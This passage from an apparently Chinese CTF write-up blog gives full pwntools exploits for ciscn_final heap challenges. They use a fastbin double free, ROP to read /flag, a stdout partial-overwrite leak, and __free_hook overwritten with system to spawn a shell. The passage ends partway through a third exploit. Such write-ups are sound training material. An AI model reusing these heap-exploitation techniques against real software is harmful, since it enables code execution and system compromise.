class="string">"index ?"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index ?"</span>, str(index))</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">__malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">openat_offset = libc.sym[<span class="string">"openat"</span>]</span><br><span class="line">read_offset = libc.sym[<span class="string">"read"</span>]</span><br><span class="line">write_offset = libc.sym[<span class="string">"write"</span>]</span><br><span class="line"><span class="comment"># realloc_offset = libc.symbols["realloc"]</span></span><br><span class="line"><span class="comment"># one_gadget_offset = 0xf02a4</span></span><br><span class="line">pop_7regs = <span class="number">0x401186</span> <span class="comment"># add rsp, 8; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401193</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401191</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">pop_rsp_r13_r14_r15 = <span class="number">0x000000000040118d</span> <span class="comment"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_rdx_offset = <span class="number">0x0000000000001b92</span> <span class="comment"># pop rdx ; ret (in libc)</span></span><br><span class="line">read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">bss = elf.bss(<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop chain</span></span><br><span class="line">payload = flat([pop_rdi, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss, <span class="number">0</span>])</span><br><span class="line">payload += flat([read_plt])</span><br><span class="line">payload += flat([pop_rsp_r13_r14_r15, bss])</span><br><span class="line">p.sendafter(<span class="string">"what is your name? "</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">new(<span class="number">0x500</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">new(<span class="number">0x28</span>, <span class="string">"AAAA"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin double free</span></span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">addr = show(<span class="number">0</span>)[:<span class="number">-1</span>]</span><br><span class="line">main_arena = u64(addr.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x58</span> - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line"><span class="comment"># one_gadget = libc_base + one_gadget_offset</span></span><br><span class="line">pop_rdx = libc_base + pop_rdx_offset</span><br><span class="line">libc_openat = libc_base + openat_offset</span><br><span class="line">libc_read = libc_base + read_offset</span><br><span class="line">libc_write = libc_base + write_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook</span></span><br><span class="line">new(<span class="number">0x68</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"EEEE"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"A"</span> * <span class="number">0x13</span> + p64(pop_7regs))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __malloc_hook</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size?"</span>, str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set gadgets on bss (using orw)</span></span><br><span class="line">payload = flat([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdi, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x100</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0</span>])</span><br><span class="line">payload += flat([libc_openat]) <span class="comment"># open "/flag"</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">3</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x110</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0x40</span>])</span><br><span class="line">payload += flat([libc_read]) <span class="comment"># read flag</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">1</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x110</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0x40</span>])</span><br><span class="line">payload += flat([libc_write]) <span class="comment"># print flag</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">"\x00"</span>)</span><br><span class="line">payload += <span class="string">"/flag\x00"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"pop_rdx: "</span> + hex(pop_rdx))</span><br><span class="line">success(<span class="string">"libc_write: "</span> + hex(libc_write))</span><br><span class="line">success(<span class="string">"libc_read: "</span> + hex(libc_read))</span><br><span class="line">success(<span class="string">"libc_openat: "</span> + hex(libc_openat))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-5"><a href="#ciscn-final-5" class="headerlink" title="ciscn_final_5"></a>ciscn_final_5</h1><h2 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h2><p>经典没有<code>show</code>的题目，bruteforce 4 bits，partial write unsorted bin-&gt;bk为stdout的做法，主要是堆布局需要点时间，写起来有点pwnable.tw上realloc的感觉了，不过显然更简单。</p><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><ol><li>利用题目储存<code>chunk</code>地址以及<code>index</code>的逻辑是两者异或之后再存入<code>chunk_array</code>中空闲的地方，若<code>index == 0x10 &amp;&amp; chunk_addr &amp; 0x10 == 0</code>，那么就可以在edit的时候，实际写的地址要向后移0x10 bytes，从而可以溢出到下一个chunk的<code>fd</code>的部分。</li><li>利用这个溢出，改掉下一个chunk的size，造成更大的chunk overlap，使得一个chunk同时存在tcache bin和unsorted bin中（间接链入unsorted bin）。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsorted bin --&gt; +--------+</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 +--------+                      +--------+ &lt;-- tcache bin</span><br><span class="line">                 |        | &#x3D;&#x3D;&gt; victim_chunk &lt;&#x3D;&#x3D; |        |</span><br><span class="line">                 +--------+                      +--------+</span><br></pre></td></tr></table></figure></li><li>由于在切割unsorted bin，使得victim_chunk的fd，bk被置入<code>main_arena+0x58</code>之后，需要进行partial write，故这里仍要需要利用<code>index == 0x10 &amp;&amp; chunk_addr &amp; 0x10 == 0</code>的方法进行0x10 bytes overflow，从从而可以覆盖到<code>victim_chunk-&gt;fd</code>。</li><li>分配到<code>stdout</code>的chunk之后，写入<code>p64(0xfbad1800) + p64(0) * 3 + &quot;\x00&quot;</code>就可以leak libc了。</li><li>之后继续利用0x10 bytes overflow，分配<code>__free_hook</code>的chunk，写入<code>system</code>，再<code>free</code>一个”/bin/sh”的chunk，就可以getshell了。</li></ol><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">offset =  <span class="number">0x3eb780</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># bruteforce 4 bits</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># prepare two useful chunks</span></span><br><span class="line">        new(<span class="number">10</span>, <span class="number">0x58</span>, <span class="string">"nop"</span>)</span><br><span class="line">        new(<span class="number">11</span>, <span class="number">0x58</span>, <span class="string">"nop"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># first chunk (overlap)</span></span><br><span class="line">        new(<span class="number">16</span>, <span class="number">0x18</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create overlap</span></span><br><span class="line">        new(<span class="number">2</span>, <span class="number">0x3F8</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">        new(<span class="number">3</span>, <span class="number">0xF8</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        new(<span class="number">4</span>, <span class="number">0x18</span>, <span class="string">"DDDD"</span>) <span class="comment"># avoid merging to top chunk</span></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x8</span> + p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># free the chunk with index 16</span></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># unsorted bin</span></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># malloc from unsorted bin (overlap)</span></span><br><span class="line">        new(<span class="number">16</span>, <span class="number">0x3F8</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># partial write unsorted bin-&gt;bk ==&gt; stdout</span></span><br><span class="line">        edit(<span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">"A"</span> * <span class="number">0x3D8</span> + p64(<span class="number">0x101</span>) + p16(<span class="number">0x5760</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># malloc chunk at stdout</span></span><br><span class="line">        new(<span class="number">5</span>, <span class="number">0xF8</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">        new(<span class="number">6</span>, <span class="number">0xF8</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p.recv(<span class="number">3</span>) == <span class="string">"low"</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> _pwn_remote == <span class="number">1</span>:</span><br><span class="line">                p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">26969</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">                <span class="keyword">if</span> _debug == <span class="number">1</span>:</span><br><span class="line">                    gdb.attach(p, gdbscript=_source)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        p.recv(<span class="number">0x20</span> - <span class="number">3</span>)</span><br><span class="line">        libc_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">        libc_base = libc_addr - offset</span><br><span class="line">        __free_hook = libc_base + __free_hook_offset</span><br><span class="line">        libc_system = libc_base + system_offset</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> _pwn_remote == <span class="number">1</span>:</span><br><span class="line">            p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">26969</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">            <span class="keyword">if</span> _debug == <span class="number">1</span>:</span><br><span class="line">                gdb.attach(p, gdbscript=_source)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin is broken</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="number">16</span>, <span class="number">0x58</span>, <span class="string">"HHHH"</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x48</span> + p64(<span class="number">0x61</span>) + p64(__free_hook))</span><br><span class="line">new(<span class="number">12</span>, <span class="number">0x58</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">new(<span class="number">13</span>, <span class="number">0x58</span>, p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"><span class="comment"># success(": " + hex())</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-6"><a href="#ciscn-final-6" class="headerlink" title="ciscn_final_6"></a>ciscn_final_6</h1><h2 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h2><p>有点坑，题目给的libc是2.23，搞得我直接用2.23写了fastbin attack，然后打远程发现有tcache，才发现题目上写Ubuntu 18的环境。题目本身还是很简单的。</p><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><ol><li>解迷宫，拿到<code>malloc</code>的地址，从而得到libc地址。</li><li><code>new game</code>会创造一个新的<code>player</code>信息，先进行<code>store game</code>，然后<code>delete record</code>将当前的<code>player</code>删除，此时再依次<code>load game</code>和<code>delete record</code>，将被delete掉的<code>player</code>进行二次删除，构成tcache double free。</li><li><code>malloc</code>位于<code>__free_hook</code>的chunk，写为<code>system</code>，然后<code>free</code>一个”/bin/sh”的chunk，getshell。</li></ol><h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resume</span><span class="params">(count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"0"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(name, count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"what's your name?"</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(index, count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store</span><span class="params">(flag, size, comment)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">        p.sendafter(<span class="string">"any comment?"</span>, <span class="string">'y'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"comment size?"</span>, str(size))</span><br><span class="line">        p.sendafter(<span class="string">"plz input comment"</span>, comment)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">"any comment?"</span>, <span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_user</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(maze, start, end, sol)</span>:</span></span><br><span class="line">    <span class="comment"># arrive at end</span></span><br><span class="line">    <span class="keyword">if</span> start == end:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move right if possible</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">1</span>] + <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>]][start[<span class="number">1</span>] + <span class="number">1</span>] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>], start[<span class="number">1</span>] + <span class="number">1</span>), end, sol):</span><br><span class="line">            sol.append(<span class="string">'D'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move down</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">0</span>] + <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>] + <span class="number">1</span>][start[<span class="number">1</span>]] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>] + <span class="number">1</span>, start[<span class="number">1</span>]), end, sol):</span><br><span class="line">            sol.append(<span class="string">'S'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move left</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">1</span>] - <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>]][start[<span class="number">1</span>] - <span class="number">1</span>] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>], start[<span class="number">1</span>] - <span class="number">1</span>), end, sol):</span><br><span class="line">            sol.append(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move up</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">0</span>] - <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>] - <span class="number">1</span>][start[<span class="number">1</span>]] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>] - <span class="number">1</span>, start[<span class="number">1</span>]), end, sol):</span><br><span class="line">            sol.append(<span class="string">'W'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_maze</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"9"</span>)</span><br><span class="line">    maze = p.recvuntil(<span class="string">"x"</span> * <span class="number">42</span>)</span><br><span class="line">    maze += p.recvuntil(<span class="string">"x"</span> * <span class="number">42</span> + <span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">    maze = maze.split(<span class="string">'\n'</span>)</span><br><span class="line">    maze = [list(item[<span 